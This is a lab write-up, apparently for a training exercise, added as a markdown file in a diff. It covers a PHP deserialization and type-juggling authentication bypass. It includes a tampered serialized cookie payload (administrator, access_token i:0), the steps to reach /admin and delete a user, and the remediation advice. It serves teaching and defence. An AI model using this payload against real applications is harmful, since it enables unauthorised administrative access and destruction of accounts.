@@ -1,0 +1,317 @@
+# PHP Deserialization - Type Juggling Authentication Bypass
+
+## Executive Summary
+
+A PHP deserialization vulnerability was identified in the session management mechanism. The application stores a serialized PHP object inside a client-controlled cookie and deserializes it without validating its integrity.
+
+By modifying both the value and the data type of the `access_token` property, it is possible to exploit PHP's loose type comparison (Type Juggling), impersonate the `administrator` user, gain access to the administrative panel, and perform privileged actions.
+
+---
+
+# Vulnerability Classification
+
+| Property | Value |
+|----------|------|
+| Category | Insecure Deserialization |
+| Language | PHP |
+| CWE | CWE-502 - Deserialization of Untrusted Data |
+| Related Weakness | CWE-843 - Access of Resource Using Incompatible Type ("Type Confusion") |
+| Impact | Authentication Bypass |
+| Severity | High |
+
+---
+
+# Summary
+
+The application stores a serialized `User` object inside the session cookie.
+
+Instead of validating the authenticity of the serialized object, the server blindly deserializes user-controlled data and trusts every property contained within it.
+
+By replacing the username with `administrator` and changing the `access_token` from a string to the integer `0`, the application incorrectly authenticates the attacker as the administrator due to unsafe PHP type comparisons.
+
+---
+
+# Affected Component
+
+```
+Session Cookie
+```
+
+Serialized PHP Object
+
+---
+
+# Original Serialized Object
+
+```php
+O:4:"User":2:{
+    s:8:"username";
+    s:6:"wiener";
+    s:12:"access_token";
+    s:32:"h44xq16ypk7tswmq5hmfdr7qam7l31kd";
+}
+```
+
+---
+
+# Vulnerability Details
+
+The session cookie contains a serialized PHP object representing the authenticated user.
+
+The application performs the following operations:
+
+1. Receives the session cookie.
+2. Base64 decodes it.
+3. Executes `unserialize()`.
+4. Trusts every property inside the resulting object.
+
+Because the cookie is neither signed nor integrity protected, an attacker can freely modify every property before it reaches the server.
+
+Unlike the previous lab, this application also performs an insecure comparison involving the `access_token` property.
+
+---
+
+# Proof of Concept
+
+## Step 1
+
+Log into the application using valid credentials.
+
+Capture the following request:
+
+```http
+GET /my-account HTTP/2
+```
+
+---
+
+## Step 2
+
+Decode the session cookie using Burp Inspector.
+
+Original object:
+
+```php
+O:4:"User":2:{
+    s:8:"username";
+    s:6:"wiener";
+    s:12:"access_token";
+    s:32:"h44xq16ypk7tswmq5hmfdr7qam7l31kd";
+}
+```
+
+---
+
+## Step 3
+
+Replace it with:
+
+```php
+O:4:"User":2:{
+    s:8:"username";
+    s:13:"administrator";
+    s:12:"access_token";
+    i:0;
+}
+```
+
+Notice two important changes:
+
+- Username changed to **administrator**
+- `access_token` changed from a **string** to an **integer**
+
+---
+
+## Step 4
+
+Apply the changes using Burp Inspector.
+
+Burp automatically:
+
+- serializes the object;
+- Base64 encodes it;
+- updates the session cookie.
+
+---
+
+## Step 5
+
+Send the request.
+
+The application authenticates the attacker as the administrator and returns the administrative panel link.
+
+---
+
+## Step 6
+
+Browse to:
+
+```http
+GET /admin HTTP/2
+```
+
+---
+
+## Step 7
+
+Delete the victim account:
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+```
+
+---
+
+# Why the Exploit Works
+
+The application trusts user-controlled serialized objects.
+
+During deserialization, the attacker changes both:
+
+- the username;
+- the data type of the access token.
+
+Instead of comparing two strings securely, the application performs a loose comparison that is affected by PHP's automatic type conversion.
+
+Because the integer `0` is interpreted differently than a string token, the authentication logic incorrectly validates the object as belonging to the administrator.
+
+The application therefore grants administrator privileges.
+
+---
+
+# Root Cause
+
+The vulnerability exists because the application:
+
+- stores authorization data inside a client-controlled cookie;
+- deserializes untrusted input;
+- performs insecure type comparisons;
+- does not verify the integrity of serialized objects.
+
+---
+
+# Impact
+
+An attacker can:
+
+- impersonate arbitrary users;
+- authenticate as the administrator;
+- bypass authorization controls;
+- execute privileged administrative actions;
+- compromise the application completely.
+
+---
+
+# Remediation
+
+## Never deserialize untrusted data
+
+Avoid calling:
+
+```php
+unserialize($_COOKIE['session']);
+```
+
+on data received from the client.
+
+---
+
+## Store session data server-side
+
+Cookies should only contain a random session identifier.
+
+Example:
+
+```
+session=0d91a82a9e45...
+```
+
+All user information should remain on the server.
+
+---
+
+## Sign serialized objects
+
+If serialized data must be stored client-side, protect it with an HMAC or digital signature.
+
+---
+
+## Use strict comparisons
+
+Avoid loose comparisons:
+
+```php
+==
+```
+
+Instead use:
+
+```php
+===
+```
+
+to prevent PHP Type Juggling vulnerabilities.
+
+---
+
+## Avoid serializing authorization data
+
+Never store:
+
+- roles
+- permissions
+- administrator flags
+- access tokens
+
+inside client-controlled cookies.
+
+---
+
+# Attack Flow
+
+```text
+                Login
+                   │
+                   ▼
+        Server creates User object
+                   │
+                   ▼
+            serialize(User)
+                   │
+                   ▼
+          Base64(Session Cookie)
+                   │
+                   ▼
+      Attacker modifies cookie
+
+        username → administrator
+
+        access_token
+        string → integer (0)
+
+                   │
+                   ▼
+          Server unserializes object
+                   │
+                   ▼
+     Loose PHP comparison succeeds
+                   │
+                   ▼
+      User authenticated as admin
+                   │
+                   ▼
+          Access /admin
+                   │
+                   ▼
+ Delete /admin/delete?username=carlos
+```
+
+---
+
+# Key Takeaways
+
+- PHP serialization is not inherently insecure.
+- The vulnerability arises when applications trust serialized data supplied by the client.
+- Loose type comparisons (`==`) can introduce Type Juggling vulnerabilities.
+- Authentication and authorization data should never be stored in unsigned client-side serialized objects.
+- Session integrity should always be protected using server-side storage or cryptographic signatures.
